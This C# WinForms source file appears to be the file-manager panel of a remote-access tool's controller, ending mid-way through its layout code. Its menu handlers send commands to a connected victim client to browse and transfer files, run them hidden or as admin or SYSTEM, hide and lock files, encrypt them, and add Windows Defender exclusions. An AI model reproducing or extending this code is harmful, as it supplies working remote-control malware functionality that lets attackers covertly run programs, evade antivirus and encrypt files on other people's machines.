using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Windows.Forms;
using CustomControls.RJControls;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormExplorer : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private Panel panel1;

	private Panel panel2;

	private Panel panel3;

	private DataGridViewImageColumn Column2;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewImageColumn Column3;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn1;

	public DataGridView dataGridView1;

	public DataGridView dataGridView3;

	public DataGridView dataGridView2;

	public ImageList imageList1;

	private ContextMenuStrip contextMenuStrip1;

	private ToolStripMenuItem backToolStripMenuItem;

	public MaterialLabel materialLabel1;

	public RJTextBox rjTextBox1;

	private Panel panel4;

	private ToolStripMenuItem refreshToolStripMenuItem;

	public Timer timer1;

	private ToolStripMenuItem createFolderToolStripMenuItem;

	private ToolStripMenuItem upDownToolStripMenuItem;

	private ToolStripMenuItem uploadToolStripMenuItem;

	private ToolStripMenuItem downloadToolStripMenuItem;

	private ToolStripMenuItem createFileToolStripMenuItem;

	private ToolStripMenuItem createFolderToolStripMenuItem1;

	private ToolStripMenuItem renameToolStripMenuItem;

	private ToolStripMenuItem removeToolStripMenuItem;

	private ToolStripMenuItem copyToolStripMenuItem;

	private ToolStripMenuItem pasteToolStripMenuItem;

	private ToolStripMenuItem cutToolStripMenuItem;

	private ToolStripMenuItem zipToolStripMenuItem;

	private ToolStripMenuItem unzipToolStripMenuItem;

	private ToolStripMenuItem zipToolStripMenuItem1;

	private ToolStripMenuItem excuteToolStripMenuItem;

	private ToolStripMenuItem excuteToolStripMenuItem1;

	private ToolStripMenuItem executeToolStripMenuItem;

	private ToolStripMenuItem executeToolStripMenuItem1;

	private ToolStripMenuItem executeToolStripMenuItem2;

	private ToolStripMenuItem attributesToolStripMenuItem;

	private ToolStripMenuItem hiddenToolStripMenuItem;

	private ToolStripMenuItem systemToolStripMenuItem;

	private ToolStripMenuItem normalToolStripMenuItem;

	private ToolStripMenuItem directoryToolStripMenuItem;

	private ToolStripMenuItem lockRemoveToolStripMenuItem;

	private ToolStripMenuItem unlockRemoveToolStripMenuItem;

	private DataGridViewImageColumn Column4;

	private DataGridViewTextBoxColumn Column6;

	private DataGridViewTextBoxColumn Column7;

	private DataGridViewTextBoxColumn Column5;

	private DataGridViewTextBoxColumn dataGridViewTextBoxColumn2;

	private ToolStripMenuItem cryptoToolStripMenuItem;

	private ToolStripMenuItem encryptToolStripMenuItem;

	private ToolStripMenuItem decryptToolStripMenuItem;

	private ToolStripMenuItem defenderToolStripMenuItem;

	private ToolStripMenuItem execlitToolStripMenuItem;

	private ToolStripMenuItem removeExclusionToolStripMenuItem;

	private ToolStripMenuItem audioToolStripMenuItem;

	private ToolStripMenuItem wallpaperToolStripMenuItem;

	public FormExplorer()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormExplorer_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		rjTextBox1.textBox1.ReadOnly = true;
		dataGridView1.DoubleClick += dataGridView1_DoubleClick;
		dataGridView2.DoubleClick += dataGridView2_DoubleClick;
		dataGridView3.DoubleClick += dataGridView3_DoubleClick;
		dataGridView2.DragEnter += dataGridView2_DragEnter;
		dataGridView2.DragDrop += dataGridView2_DragDrop;
		dataGridView2.DragOver += dataGridView2_DragOver;
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, dataGridView1, new object[1] { true });
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, dataGridView2, new object[1] { true });
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, dataGridView3, new object[1] { true });
	}

	private void ChangeScheme(object sender)
	{
		rjTextBox1.BorderColor = FormMaterial.PrimaryColor;
		dataGridView1.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		dataGridView1.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView1.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		dataGridView1.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView3.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		dataGridView3.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView3.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		dataGridView3.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void dataGridView3_DoubleClick(object sender, EventArgs e)
	{
		if (dataGridView3.SelectedRows.Count != 0)
		{
			dataGridView1.Enabled = false;
			dataGridView3.Enabled = false;
			dataGridView2.Enabled = false;
			materialLabel1.Text = "Please wait";
			client.Send(LEB128.Write(new object[2]
			{
				"GetVariblePath",
				(string)dataGridView3.SelectedRows[0].Cells[1].Value
			}));
		}
	}

	private void dataGridView1_DoubleClick(object sender, EventArgs e)
	{
		if (dataGridView1.SelectedRows.Count != 0)
		{
			dataGridView1.Enabled = false;
			dataGridView3.Enabled = false;
			dataGridView2.Enabled = false;
			materialLabel1.Text = "Please wait";
			client.Send(LEB128.Write(new object[2]
			{
				"GetPath",
				(string)dataGridView1.SelectedRows[0].Cells[1].Value
			}));
		}
	}

	private void dataGridView2_DoubleClick(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count == 0 || string.IsNullOrEmpty(rjTextBox1.Texts))
		{
			return;
		}
		object tagValue = dataGridView2.SelectedRows[0].Cells[0].Tag;
		if (tagValue == null)
		{
			return;
		}
		byte tag;
		if (tagValue is byte)
		{
			tag = (byte)tagValue;
		}
		else if (tagValue is int)
		{
			tag = (byte)(int)tagValue;
		}
		else
		{
			try
			{
				tag = Convert.ToByte(tagValue);
			}
			catch
			{
				return;
			}
		}
		if (tag == 0 && rjTextBox1.Texts.Length > 3)
		{
			client.Send(LEB128.Write(new object[2]
			{
				"Execute",
				Path.Combine(rjTextBox1.Texts, (string)dataGridView2.SelectedRows[0].Cells[1].Value)
			}));
		}
		if (tag == 1)
		{
			dataGridView1.Enabled = false;
			dataGridView3.Enabled = false;
			dataGridView2.Enabled = false;
			materialLabel1.Text = "Please wait";
			client.Send(LEB128.Write(new object[2]
			{
				"GetPath",
				Path.Combine(rjTextBox1.Texts, (string)dataGridView2.SelectedRows[0].Cells[1].Value)
			}));
		}
		if (tag == 2 && rjTextBox1.Texts.Length > 3)
		{
			string text = rjTextBox1.Texts.Remove(rjTextBox1.Texts.LastIndexOfAny(new char[1] { '\\' }, rjTextBox1.Texts.LastIndexOf('\\')));
			if (!text.Contains("\\"))
			{
				text += "\\";
			}
			dataGridView1.Enabled = false;
			dataGridView3.Enabled = false;
			dataGridView2.Enabled = false;
			materialLabel1.Text = "Please wait";
			client.Send(LEB128.Write(new object[2] { "GetPath", text }));
		}
	}

	private void backToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length >= 3)
		{
			string text = rjTextBox1.Texts.Remove(rjTextBox1.Texts.LastIndexOfAny(new char[1] { '\\' }, rjTextBox1.Texts.LastIndexOf('\\')));
			if (!text.Contains("\\"))
			{
				text += "\\";
			}
			dataGridView1.Enabled = false;
			dataGridView3.Enabled = false;
			dataGridView2.Enabled = false;
			materialLabel1.Text = "Please wait";
			client.Send(LEB128.Write(new object[2] { "GetPath", text }));
		}
	}

	private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length >= 3)
		{
			dataGridView1.Enabled = false;
			dataGridView3.Enabled = false;
			dataGridView2.Enabled = false;
			materialLabel1.Text = "Please wait";
			client.Send(LEB128.Write(new object[2] { "GetPath", rjTextBox1.Texts }));
		}
	}

	private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3)
		{
			return;
		}
		using OpenFileDialog openFileDialog = new OpenFileDialog();
		openFileDialog.Multiselect = true;
		if (openFileDialog.ShowDialog() == DialogResult.OK)
		{
			string[] fileNames = openFileDialog.FileNames;
			foreach (string text in fileNames)
			{
				FormUpload formUpload = new FormUpload();
				formUpload.path = text;
				formUpload.pathto = Path.Combine(rjTextBox1.Texts, new FileInfo(text).Name);
				formUpload.Name = "FormUpload:" + client.Hwid + "." + formUpload.pathto;
				formUpload.Text = "Upload: " + client.Hwid;
				formUpload.parrent = client;
				formUpload.Show();
				client.Send(LEB128.Write(new object[2] { "UploadConnect", formUpload.Name }));
			}
		}
	}

	private void dataGridView2_DragDrop(object sender, DragEventArgs e)
	{
		if (rjTextBox1.Texts.Length >= 3)
		{
			string[] array = (string[])e.Data.GetData(DataFormats.FileDrop);
			foreach (string text in array)
			{
				FormUpload formUpload = new FormUpload();
				formUpload.path = text;
				formUpload.pathto = Path.Combine(rjTextBox1.Texts, new FileInfo(text).Name);
				formUpload.Name = "FormUpload:" + client.Hwid + "." + formUpload.pathto;
				formUpload.Text = "Upload: " + client.Hwid;
				formUpload.parrent = client;
				formUpload.Show();
				client.Send(LEB128.Write(new object[2] { "UploadConnect", formUpload.Name }));
			}
		}
	}

	private void dataGridView2_DragEnter(object sender, DragEventArgs e)
	{
		if (e.Data.GetDataPresent(DataFormats.FileDrop))
		{
			e.Effect = DragDropEffects.Copy;
		}
		else
		{
			e.Effect = DragDropEffects.None;
		}
	}

	private void dataGridView2_DragOver(object sender, DragEventArgs e)
	{
		e.Effect = DragDropEffects.Copy;
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (!parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0 || dataGridView2.SelectedRows[0].Index == 0)
		{
			return;
		}
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			client.Send(LEB128.Write(new object[2]
			{
				"DownloadConnect",
				Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value)
			}));
		}
	}

	private void renameToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length >= 3 && dataGridView2.SelectedRows.Count != 0 && dataGridView2.SelectedRows[0].Index != 0)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Rename";
			formInput.rjTextBox1.PlaceholderText = "New name";
			formInput.rjTextBox1.Texts = (string)dataGridView2.SelectedRows[0].Cells[1].Value;
			formInput.ShowDialog();
			if (formInput.Run && formInput.rjTextBox1.Texts != (string)dataGridView2.SelectedRows[0].Cells[1].Value)
			{
				client.Send(LEB128.Write(new object[4]
				{
					"Rename",
					rjTextBox1.Texts,
					(string)dataGridView2.SelectedRows[0].Cells[1].Value,
					formInput.rjTextBox1.Texts
				}));
			}
		}
	}

	private void removeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"Remove",
			string.Join(";", list.ToArray())
		}));
	}

	private void copyToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"Copy",
			string.Join(";", list.ToArray())
		}));
	}

	private void cutToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"Cut",
			string.Join(";", list.ToArray())
		}));
	}

	private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length >= 3)
		{
			client.Send(LEB128.Write(new object[2] { "Paste", rjTextBox1.Texts }));
		}
	}

	private void createFileToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length >= 3)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Create File";
			formInput.rjTextBox1.PlaceholderText = "File name";
			formInput.ShowDialog();
			if (formInput.Run && !string.IsNullOrEmpty(formInput.rjTextBox1.Texts))
			{
				client.Send(LEB128.Write(new object[2]
				{
					"CreateFile",
					Path.Combine(rjTextBox1.Texts, formInput.rjTextBox1.Texts)
				}));
			}
		}
	}

	private void createFolderToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length >= 3)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Create Folder";
			formInput.rjTextBox1.PlaceholderText = "Folder name";
			formInput.ShowDialog();
			if (formInput.Run && !string.IsNullOrEmpty(formInput.rjTextBox1.Texts))
			{
				client.Send(LEB128.Write(new object[2]
				{
					"CreateFolder",
					Path.Combine(rjTextBox1.Texts, formInput.rjTextBox1.Texts)
				}));
			}
		}
	}

	private void excuteToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"Execute",
			string.Join(";", list.ToArray())
		}));
	}

	private void executeToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"ExecuteHidden",
			string.Join(";", list.ToArray())
		}));
	}

	private void executeToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"ExecuteAdmin",
			string.Join(";", list.ToArray())
		}));
	}

	private void executeToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"ExecuteSystem",
			string.Join(";", list.ToArray())
		}));
	}

	private void unzipToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"UnZip",
			string.Join(";", list.ToArray())
		}));
	}

	private void zipToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[3]
		{
			"Zip",
			rjTextBox1.Texts,
			string.Join(";", list.ToArray())
		}));
	}

	private void hiddenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[3]
		{
			"Attribute",
			"Hidden",
			string.Join(";", list.ToArray())
		}));
	}

	private void systemToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[3]
		{
			"Attribute",
			"System",
			string.Join(";", list.ToArray())
		}));
	}

	private void normalToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[3]
		{
			"Attribute",
			"Normal",
			string.Join(";", list.ToArray())
		}));
	}

	private void directoryToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[3]
		{
			"Attribute",
			"Directory",
			string.Join(";", list.ToArray())
		}));
	}

	private void lockRemoveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[3]
		{
			"Attribute",
			"Lock",
			string.Join(";", list.ToArray())
		}));
	}

	private void unlockRemoveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[3]
		{
			"Attribute",
			"Unlock",
			string.Join(";", list.ToArray())
		}));
	}

	private void encryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"Encrypt",
			string.Join(";", list.ToArray())
		}));
	}

	private void decryptToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"Decrypt",
			string.Join(";", list.ToArray())
		}));
	}

	private void execlitToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
		}
		client.Send(LEB128.Write(new object[2]
		{
			"AddExclusion",
			string.Join(";", list.ToArray())
		}));
	}

	private void removeExclusionToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
		}
		client.Send(LEB128.Write(new object[2]
		{
			"RemoveExclusion",
			string.Join(";", list.ToArray())
		}));
	}

	private void audioToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length < 3 || dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		List<string> list = new List<string>();
		foreach (DataGridViewRow dataGridViewRow in dataGridView2.SelectedRows)
		{
			if (dataGridViewRow.Index != 0)
			{
				list.Add(Path.Combine(rjTextBox1.Texts, (string)dataGridViewRow.Cells[1].Value));
			}
		}
		client.Send(LEB128.Write(new object[2]
		{
			"Audio",
			string.Join(";", list.ToArray())
		}));
	}

	private void wallpaperToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (rjTextBox1.Texts.Length >= 3 && dataGridView2.SelectedRows.Count != 0)
		{
			client.Send(LEB128.Write(new object[2]
			{
				"Wallpaper",
				Path.Combine(rjTextBox1.Texts, (string)dataGridView2.SelectedRows[0].Cells[1].Value)
			}));
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager componentResourceManager = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormExplorer));
		this.panel1 = new System.Windows.Forms.Panel();
		this.dataGridView3 = new System.Windows.Forms.DataGridView();
		this.Column2 = new System.Windows.Forms.DataGridViewImageColumn();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.dataGridView1 = new System.Windows.Forms.DataGridView();
		this.Column3 = new System.Windows.Forms.DataGridViewImageColumn();
		this.dataGridViewTextBoxColumn1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.panel2 = new System.Windows.Forms.Panel();
		this.dataGridView2 = new System.Windows.Forms.DataGridView();
		this.Column4 = new System.Windows.Forms.DataGridViewImageColumn();
		this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.dataGridViewTextBoxColumn2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.backToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.upDownToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.downloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.uploadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.createFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.createFileToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.createFolderToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.renameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.removeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.cutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.pasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.zipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.unzipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.zipToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.excuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.excuteToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.executeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.executeToolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
		this.executeToolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.attributesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.normalToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.hiddenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.systemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.directoryToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.lockRemoveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.unlockRemoveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.cryptoToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.encryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.decryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.defenderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.execlitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.removeExclusionToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		this.panel3 = new System.Windows.Forms.Panel();
		this.materialLabel1 = new MaterialSkin.Controls.MaterialLabel();
		this.imageList1 = new System.Windows.Forms.ImageList(this.components);
		this.panel4 = new System.Windows.Forms.Panel();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.audioToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.wallpaperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView3).BeginInit();
